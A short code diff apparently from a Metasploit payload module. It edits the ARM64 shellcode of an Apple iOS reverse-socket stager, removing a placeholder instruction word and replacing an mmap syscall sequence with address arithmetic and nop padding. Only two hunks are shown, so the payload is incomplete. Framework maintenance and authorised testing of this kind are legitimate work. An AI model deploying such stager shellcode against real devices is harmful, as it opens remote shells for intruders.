@@ -39,8 +39,7 @@ module MetasploitModule
           'Payload' =>
           [
             # Generated from external/source/shellcode/linux/apple_ios/stager_sock_reverse.s
-            0x41414141,
-            #0xd2800040,          #  mov	x0, #0x2                   	// #2
+            0xd2800040,          #  mov	x0, #0x2                   	// #2
             0xd2800021,          #  mov	x1, #0x1                   	// #1
             0xd2800002,          #  mov	x2, #0x0                   	// #0
             0xd2800c30,          #  mov	x16, #0x61                  	// #97
@@ -63,16 +62,16 @@ module MetasploitModule
             0xd34cfc42,          #  lsr	x2, x2, #12
             0x91000442,          #  add	x2, x2, #0x1
             0xd374cc42,          #  lsl	x2, x2, #12
-            0xaa1f03e0,          #  mov	x0, xzr
-            0xaa0203e1,          #  mov	x1, x2
-            0xd28000e2,          #  mov	x2, #0x7                   	// #7
-            0xd2830043,          #  mov	x3, #0x1802                	// #6146
-            0xaa1f03e4,          #  mov	x4, xzr
-            0xaa1f03e5,          #  mov	x5, xzr
-            0xd28018b0,          #  mov	x16, #0xc5                  	// #197
-            0xd4000001,          #  svc	#0x0
-            0xb100041f,          #  cmn	x0, #0x1
-            0x54000200,          #  b.eq	c0 <failed>
+            0x100003c0,          #  adr	x0, d4 <next_stage>
+            0xd34cfc00,          #  lsr	x0, x0, #12
+            0x91000400,          #  add	x0, x0, #0x1
+            0xd374cc00,          #  lsl	x0, x0, #12
+            0xd503201f,          #  nop
+            0xd503201f,          #  nop
+            0xd503201f,          #  nop
+            0xd503201f,          #  nop
+            0xd503201f,          #  nop
+            0xd503201f,          #  nop
             0xb94003e4,          #  ldr	w4, [sp]
             0xf90003e0,          #  str	x0, [sp]
             0xaa0003e3,          #  mov	x3, x0
